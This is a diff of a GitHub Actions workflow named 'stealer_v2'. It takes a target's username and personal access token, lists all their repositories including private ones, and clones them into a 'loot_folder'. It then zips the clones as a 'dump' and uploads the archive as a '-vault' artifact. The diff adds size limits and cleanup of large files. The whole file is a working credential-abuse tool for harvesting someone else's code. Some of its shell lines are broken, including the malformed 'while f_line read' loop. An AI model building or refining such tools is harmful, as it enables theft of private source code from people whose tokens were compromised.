@@ -1,4 +1,4 @@
-name: stealer
+name: stealer_v2
 on:
   workflow_dispatch:
     inputs:
@@ -9,10 +9,9 @@ on:
       target_token:
         description: 'PAT'
         required: true
-      include_private:
-        description: 'private also?'
-        type: boolean
-        default: true
+      size_limit_mb:
+        description: 'Size'
+        default: '300'
 
 jobs:
   harvest:
@@ -21,41 +20,75 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: set
-        run: sudo apt-get install -y jq zip
+      - name: Preparing Tools
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y jq zip bc
 
-      - name: get
+      - name: Inspection and Cloning
         env:
           T_TOKEN: ${{ github.event.inputs.target_token }}
           T_USER: ${{ github.event.inputs.target_username }}
+          LIMIT: ${{ github.event.inputs.size_limit_mb }}
         run: |
           mkdir loot_folder
-          echo "[*] check repos: $T_USER"
+          echo "=== STARTING INSPECTION FOR $T_USER ==="
           
-          REPOS=$(curl -s -H "Authorization: token $T_TOKEN" \
-            "https://api.github.com/user/repos?visibility=all&per_page=100" | jq -r '.[].full_name')
-
-          if [ -z "$REPOS" ] || [ "$REPOS" == "null" ]; then
-            echo "[!] failed check"
-            REPOS=$(curl -s "https://api.github.com/users/$T_USER/repos?per_page=100" | jq -r '.[].full_name')
+          # Ambil data semua repo (termasuk size)
+          REPO_DATA=$(curl -s -H "Authorization: token $T_TOKEN" \
+            "https://api.github.com/user/repos?visibility=all&per_page=100")
+          
+          # Cek apakah token valid/bisa narik data
+          if echo "$REPO_DATA" | grep -q "message"; then
+            echo "[!] Error dari GitHub API: $(echo "$REPO_DATA" | jq -r '.message')"
+            exit 1
           fi
 
-          echo "[+] found repos"
-          
-          for REPO in $REPOS; do
-            FOLDER_NAME=$(echo $REPO | sed 's/\//_/g')
-            echo "[*] getting: $REPO"
+          # Hitung total estimasi
+          TOTAL_KB=$(echo "$REPO_DATA" | jq '[.[].size] | add')
+          TOTAL_MB=$(echo "scale=2; $TOTAL_KB / 1024" | bc)
+          echo "[i] Estimasi total ukuran kotor: $TOTAL_MB MB"
+          echo "------------------------------------------------"
+
+          # Proses per-repository
+          echo "$REPO_DATA" | jq -r '.[] | "\(.full_name)|\(.size)"' | while f_line read line; do
+            REPO_NAME=$(echo $line | cut -d'|' -f1)
+            REPO_SIZE_KB=$(echo $line | cut -d'|' -f2)
+            REPO_SIZE_MB=$(echo "scale=2; $REPO_SIZE_KB / 1024" | bc)
             
-            git clone --depth 1 "https://$T_TOKEN@github.com/$REPO.git" "loot_folder/$FOLDER_NAME"
+            # Cek Limit
+            if (( $(echo "$REPO_SIZE_MB > $LIMIT" | bc -l) )); then
+              echo "[SKIP] $REPO_NAME ($REPO_SIZE_MB MB) terlalu besar!"
+              continue
+            fi
+
+            echo "[GET] $REPO_NAME ($REPO_SIZE_MB MB)..."
+            FOLDER_NAME=$(echo $REPO_NAME | sed 's/\//_/g')
+            
+            # Clone tanpa history agar ringan
+            git clone --depth 1 "https://$T_TOKEN@github.com/$REPO_NAME.git" "loot_folder/$FOLDER_NAME" 2>/dev/null
+            
+            # Bersihkan folder .git di dalam hasil clone agar tidak menumpuk ukuran
+            rm -rf "loot_folder/$FOLDER_NAME/.git"
           done
 
-      - name: zip
+      - name: Cleanup Large Files (Optional)
+        run: |
+          echo "=== CLEANING UP TRASH FILES ==="
+          # Hapus file binari atau file di atas 50MB yang mungkin terbawa (aset game/video)
+          find loot_folder -type f -size +50M -delete
+          # Hapus file zip/rar/7z yang mungkin ada di dalam repo
+          find loot_folder -name "*.zip" -o -name "*.rar" -o -name "*.7z" -o -name "*.exe" -delete
+          echo "[+] Cleanup done."
+
+      - name: Zipping
         run: |
           zip -r "dump_${{ github.event.inputs.target_username }}.zip" loot_folder/
+          echo "[i] Final Zip Size: $(du -h dump_${{ github.event.inputs.target_username }}.zip | cut -f1)"
 
-      - name: post
+      - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: ${{ github.event.inputs.target_username }}-vault
+          name: ${{ github.event.inputs.target_username }}-vault-clean
           path: "dump_${{ github.event.inputs.target_username }}.zip"
-          retention-days: 100
+          retention-days: 7
